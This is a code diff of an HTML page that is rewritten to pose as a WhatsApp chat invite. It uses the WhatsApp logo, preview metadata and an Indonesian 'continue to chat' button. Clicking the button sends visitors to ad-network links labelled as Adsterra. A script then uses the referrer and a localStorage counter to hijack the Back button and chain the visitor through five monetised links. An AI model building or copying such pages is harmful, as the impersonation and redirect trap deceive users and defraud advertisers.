@@ -1,71 +1,122 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Exclusive Access</title>
+  <title>WhatsApp</title>
+
+  <!-- Meta Thumbnail -->
+  <meta property="og:title" content="WhatsApp Chat Invite">
+  <meta property="og:description" content="Lanjutkan ke Chat WhatsApp sekarang.">
+  <meta property="og:image" content="https://i.imgur.com/4XZ09QB.jpeg">
+  <meta property="og:type" content="website">
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #111;
-      color: #fff;
+      background: #fff;
+      margin: 0;
+      padding: 0;
       text-align: center;
-      padding: 40px;
     }
-    .card {
-      background: #222;
-      padding: 25px;
-      border-radius: 14px;
-      max-width: 420px;
-      margin: auto;
-      box-shadow: 0 0 15px rgba(255,0,100,0.4);
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 15px;
+      background: #fff;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.1);
     }
-    h2 {
-      color: #ff4081;
+    .header img {
+      height: 24px;
+      margin-right: 8px;
+    }
+    .header h1 {
+      font-size: 18px;
+      color: #25d366;
+      margin: 0;
+    }
+    .thumbnail {
+      margin: 40px auto 20px;
+    }
+    .thumbnail img {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2px solid #25d366;
+    }
+    .status {
+      margin: 10px 0;
+      font-size: 18px;
+      color: #333;
     }
     .btn {
       display: inline-block;
-      margin: 15px 0;
-      background: #ff4081;
-      color: white;
-      padding: 14px 25px;
-      border-radius: 8px;
+      background: #25d366;
+      color: #fff;
+      padding: 12px 30px;
+      border-radius: 30px;
       text-decoration: none;
-      font-size: 18px;
+      font-size: 16px;
       font-weight: bold;
-      box-shadow: 0 0 10px rgba(255,64,129,0.7);
-      transition: 0.3s;
+      margin-top: 10px;
+      cursor: pointer;
+      animation: shake 0.3s infinite;
     }
-    .btn:hover {
-      background: #e91e63;
-      transform: scale(1.05);
-    }
-    .hidden {
-      display: none;
+
+    /* Animasi tombol goyang kanan kiri */
+    @keyframes shake {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(-4px); }
+      50% { transform: translateX(4px); }
+      75% { transform: translateX(-4px); }
+      100% { transform: translateX(0); }
     }
   </style>
-  <script>
-    function showButton2() {
-      document.getElementById("btn2").classList.remove("hidden");
-    }
-    function showButton3() {
-      document.getElementById("btn3").classList.remove("hidden");
-    }
-  </script>
 </head>
 <body>
-  <div class="card">
-    <h2>Welcome 🎉</h2>
-    <p>Click the buttons step by step to continue.</p>
-
-    <!-- Button 1 -->
-    <a class="btn" href="https://www.revenuecpmgate.com/jf3spyw7?key=b86d0ef790bba4687578d339e43c122d" target="_blank" onclick="showButton2()">Step 1 ➝ Open</a>
-
-    <!-- Button 2 (hidden at first) -->
-    <a id="btn2" class="btn hidden" href="https://www.revenuecpmgate.com/vgx77gqskg?key=6e980c246cebf6a0c0055c87de205995" target="_blank" onclick="showButton3()">Step 2 ➝ Continue</a>
-
-    <!-- Button 3 (hidden at first) -->
-    <a id="btn3" class="btn hidden" href="https://www.revenuecpmgate.com/wkj2qmku?key=469be1ba075a153196aae2fe5b0810c7" target="_blank">Step 3 ➝ Final Access</a>
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA">
+    <h1>WhatsApp</h1>
   </div>
+
+  <!-- Thumbnail -->
+  <div class="thumbnail">
+    <img src="https://i.imgur.com/4XZ09QB.jpeg" alt="Thumbnail">
+  </div>
+
+  <div class="status">sibuk</div>
+  <a class="btn" onclick="startRedirect()">Lanjut ke Chat</a>
+
+  <script>
+    // Daftar link Adsterra
+    let links = [
+      "https://www.revenuecpmgate.com/jf3spyw7?key=b86d0ef790bba4687578d339e43c122d",
+      "https://www.revenuecpmgate.com/uixse2d8v3?key=23a055bb47bd567cc9257c82b9b30856",
+      "https://www.revenuecpmgate.com/vgx77gqskg?key=6e980c246cebf6a0c0055c87de205995",
+      "https://www.revenuecpmgate.com/fkh92iai2k?key=51a866e3b2973ae67081f7db6868014b",
+      "https://www.revenuecpmgate.com/wkj2qmku?key=469be1ba075a153196aae2fe5b0810c7"
+    ];
+
+    let step = 0;
+
+    function startRedirect() {
+      // Simpan status step
+      localStorage.setItem("redirectStep", 0);
+      window.location.href = links[0];
+    }
+
+    // Deteksi tombol Back
+    window.onload = function() {
+      let currentStep = parseInt(localStorage.getItem("redirectStep") || 0);
+
+      if (document.referrer && currentStep < links.length - 1) {
+        currentStep++;
+        localStorage.setItem("redirectStep", currentStep);
+        window.location.href = links[currentStep];
+      }
+    };
+  </script>
 </body>
 </html>
